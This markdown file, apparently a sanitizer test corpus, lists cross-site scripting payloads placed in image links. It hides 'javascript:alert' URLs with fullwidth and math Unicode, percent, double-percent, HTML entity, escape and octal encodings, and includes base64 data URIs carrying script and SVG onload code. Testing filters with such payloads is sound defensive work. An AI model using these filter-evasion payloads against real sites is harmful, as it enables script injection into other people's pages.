# Image Source Encoding Variants

## Unicode normalization attacks
![test](ｊａｖａｓｃｒｉｐｔ:alert('fullwidth'))
![test](𝕛𝕒𝕧𝕒𝕤𝕔𝕣𝕚𝕡𝕥:alert('math'))

## Percent encoding variations
![test](%6A%61%76%61%73%63%72%69%70%74%3Aalert('hex'))
![test](%6a%61%76%61%73%63%72%69%70%74%3aalert('lower'))

## Double percent encoding
![test](%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253Aalert('double'))

## HTML entity encoding in URLs
![test](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('decimal'))
![test](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('hex'))

## Mixed encoding combinations
![test](%6A&#97;v%61&#115;&#x63;r%69pt:alert('mixed'))

## Unicode escape sequences
![test](\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003Aalert('unicode'))

## Octal encoding
![test](\152\141\166\141\163\143\162\151\160\164\072alert('octal'))

## Base64 data URI variants
![test](data:text/html;base64,PHNjcmlwdD5hbGVydCgnaW1nJyk8L3NjcmlwdD4=)
![test](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdzdmcnKSI+PC9zdmc+)